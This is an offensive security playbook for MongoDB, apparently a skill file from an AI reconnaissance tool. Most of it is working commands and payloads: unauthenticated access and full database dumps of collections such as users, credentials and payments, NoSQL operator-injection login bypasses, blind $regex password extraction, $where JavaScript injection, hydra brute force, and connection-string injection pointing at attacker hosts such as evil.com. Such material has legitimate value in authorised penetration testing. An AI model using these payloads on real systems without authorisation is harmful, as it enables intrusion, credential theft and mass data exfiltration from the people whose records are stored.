<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: mongodb
description: Security testing playbook for MongoDB covering unauthenticated access, NoSQL injection, data extraction, and MongoDB-specific attack techniques
---

# MongoDB Security Testing

MongoDB is frequently misconfigured with no authentication — exposing all databases publicly. Attack surface: no-auth by default (MongoDB < 3.0), NoSQL injection in web apps using Mongoose/MongoDB driver, unrestricted network binding, and operator injection.

---

## Reconnaissance

### Discovery

    # Port scanning
    nmap -p 27017,27018,27019 <target> -sV --open

    # Ports:
    # 27017 — MongoDB default
    # 27018 — MongoDB shard
    # 27019 — MongoDB config server

    # MongoDB banner check
    nc <target> 27017
    # Returns binary — use mongo client instead

---

## Unauthenticated Access

    # Connect without credentials
    mongosh <target>:27017
    # Or: mongo --host <target> --port 27017

    # Test auth requirement:
    mongosh --host <target> --port 27017 --eval "db.adminCommand({listDatabases: 1})"
    # If returns data without prompt → no authentication

    # Using Python pymongo:
    python3 -c "
    import pymongo
    c = pymongo.MongoClient('<target>', 27017, serverSelectionTimeoutMS=3000)
    print(c.list_database_names())
    "

---

## Enumeration

    # List all databases
    mongosh <target>:27017 --eval "db.adminCommand({listDatabases:1})"

    # Switch to database and list collections
    use admin
    show collections

    use <dbname>
    show collections

    # Count documents in a collection
    db.<collection>.countDocuments({})

    # Get first document (check structure)
    db.<collection>.findOne()

    # Get all documents
    db.<collection>.find().toArray()

    # Get all databases and collections in one shot:
    mongosh --host <target> --eval "
    var dbs = db.adminCommand({listDatabases:1}).databases;
    dbs.forEach(function(d) {
      var c = db.getSiblingDB(d.name);
      var cols = c.getCollectionNames();
      print(d.name + ': ' + cols.join(', '));
    });
    "

---

## Data Extraction

    # Target high-value collections:
    db.users.find()
    db.accounts.find()
    db.customers.find()
    db.credentials.find()
    db.sessions.find()
    db.payments.find()

    # Search for specific fields:
    db.users.find({}, {username:1, email:1, password:1, role:1})

    # Search for admin users:
    db.users.find({role: "admin"})
    db.users.find({is_admin: true})
    db.users.find({$or: [{role:"admin"}, {role:"superuser"}]})

    # Export entire collection to JSON:
    mongoexport --host <target> --db <db> --collection <col> --out output/<col>.json

    # Dump all databases:
    mongodump --host <target> --out output/mongodump/

---

## NoSQL Injection

### Boolean-based Operator Injection

When user input reaches MongoDB query without sanitization:

    # Login form — POST body JSON injection:
    POST /api/login
    Content-Type: application/json
    {"username": "admin", "password": {"$gt": ""}}    # $gt matches any non-empty string

    # $ne (not equal) bypass:
    {"username": "admin", "password": {"$ne": "wrong"}}

    # $in array bypass:
    {"username": {"$in": ["admin", "root", "superuser"]}, "password": {"$gt": ""}}

    # $regex — match any password starting with known prefix:
    {"username": "admin", "password": {"$regex": "^pass"}}

    # $where JavaScript injection (MongoDB < 4.4 or mapReduce enabled):
    {"username": "admin", "$where": "sleep(5000)"}    # Time-based blind
    {"$where": "function() { return this.username == 'admin' }"}

### URL Parameter Injection

    # Vulnerable: /api/users?username=admin
    GET /api/users?username[$gt]=
    GET /api/users?username[$ne]=wrong
    GET /api/users?username[$regex]=admin.*

    # Auth bypass:
    GET /api/login?username[$gt]=&password[$gt]=

### PHP Injection (Array Notation)

    # PHP automatically parses [] as array:
    POST /login
    username[%24gt]=&password[%24gt]=

### Enumeration via $regex (Blind)

    # Extract admin password character by character:
    {"username": "admin", "password": {"$regex": "^a"}}    # Starts with 'a'?
    {"username": "admin", "password": {"$regex": "^ab"}}   # Starts with 'ab'?
    # Binary search until full value extracted

---

## MongoDB Aggregation Pipeline Injection

    # Injection via $lookup, $graphLookup stage parameters:
    # Test: pipeline stage parameters that accept user input

    # $function operator (MongoDB 4.4+) can run JavaScript:
    db.users.aggregate([{
      "$match": {
        "$expr": {
          "$function": {
            "body": "function(name) { return true; }",
            "args": ["$name"],
            "lang": "js"
          }
        }
      }
    }])

---

## Authentication Brute Force

    # Brute force MongoDB auth
    hydra -l admin -P /usr/share/wordlists/rockyou.txt mongodb://<target>

    # nmap mongodb-brute script:
    nmap --script mongodb-brute <target> -p 27017

    # Common MongoDB credentials:
    # admin:admin, root:root, mongodb:mongodb, admin:(empty)

---

## MongoDB Configuration Analysis

    # Get server configuration (if auth bypassed or no auth):
    mongosh <target>:27017 --eval "db.adminCommand({getCmdLineOpts: 1})"
    mongosh <target>:27017 --eval "db.adminCommand({serverStatus: 1})"

    # Check if auth is enabled:
    mongosh <target>:27017 --eval "db.adminCommand({getParameter: 1, authenticationMechanisms: 1})"

    # Check replication / OpLog (for change detection):
    mongosh <target>:27017 --eval "use local; db.oplog.rs.find().sort({$natural:-1}).limit(5)"

---

## MongoDB as SSRF Target

    # Via SSRF to MongoDB (gopher or HTTP-based depending on proxy):
    # MongoDB wire protocol — not HTTP, harder to exploit directly via HTTP SSRF
    # But: if web app allows MongoDB URI configuration:
    mongodb://attacker-server:27017/<db>    # Triggers outbound connection

    # MongoDB URI injection:
    # If connection string is user-controlled:
    mongodb://localhost:27017/<db>@evil.com  # DNS rebinding
    mongodb+srv://evil.com/<db>             # SRV record lookup to attacker

---

## MongoDB Atlas / Cloud

    # Check for exposed MongoDB Atlas REST API:
    GET https://cloud.mongodb.com/api/atlas/v1.0/

    # Exposed connection strings in source code / git:
    mongodb+srv://<user>:<pass>@cluster.mongodb.net/<db>
    # Search: grep -r "mongodb+srv://" or "mongodb://" in repos

---

## Automated Scanning

    # Nmap
    nmap --script mongodb-info,mongodb-databases,mongodb-brute <target> -p 27017

    # nuclei
    nuclei -t exposures/databases/mongodb-unauth.yaml -u <target>:27017

    # nosqlmap (NoSQL injection testing)
    git clone https://github.com/codingo/NoSQLMap
    python3 nosqlmap.py    # Interactive tool for NoSQL injection

---

## Pro Tips

1. MongoDB default config binds to all interfaces (`0.0.0.0`) in older versions — check immediately
2. `$gt: ""` injection is the most reliable auth bypass for MongoDB login forms
3. `$where` JavaScript injection enables time-based blind extraction but requires JS enabled
4. Always export with `mongoexport` after verifying access — faster than manual extraction
5. OpLog (`local.oplog.rs`) contains recent database operations — may reveal credentials in plaintext
6. Connection strings in git repos are the most common way to find MongoDB credentials
7. Mongoose (Node.js ODM) does NOT sanitize operator injection by default — always test `$gt`/`$ne`

## Summary

MongoDB testing = unauthenticated access check + `listDatabases` + targeted collection dump + NoSQL injection in web forms. The `$gt: ""` operator injection bypasses authentication in most Mongoose-based Node.js apps. Unauthenticated MongoDB is a complete data breach — dump everything systematically with `mongoexport`. Always test `?field[$gt]=` in URL params and `{"field": {"$gt": ""}}` in JSON bodies.
